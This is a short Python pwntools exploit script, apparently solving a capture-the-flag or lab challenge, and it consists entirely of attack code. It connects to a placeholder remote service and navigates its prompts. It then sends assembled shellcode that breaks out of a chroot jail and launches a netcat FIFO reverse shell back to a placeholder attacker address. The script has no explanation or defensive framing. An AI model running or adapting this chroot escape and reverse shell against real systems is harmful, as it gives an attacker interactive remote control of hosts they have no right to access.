from pwn import *
context.arch = "amd64"
io = remote("TARGET_IP", 9999)
io.recvuntil(b"open?\n")
io.sendline(b"notes")
io.recvuntil(b"next?")
io.send(asm(shellcraft.amd64.chdir("..") + shellcraft.amd64.chroot(".") + shellcraft.amd64.execve("/bin/sh", ["/bin/sh", "-c", "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc YOUR_IP PORT >/tmp/f"])))
print(io.recvall(timeout=2).decode())
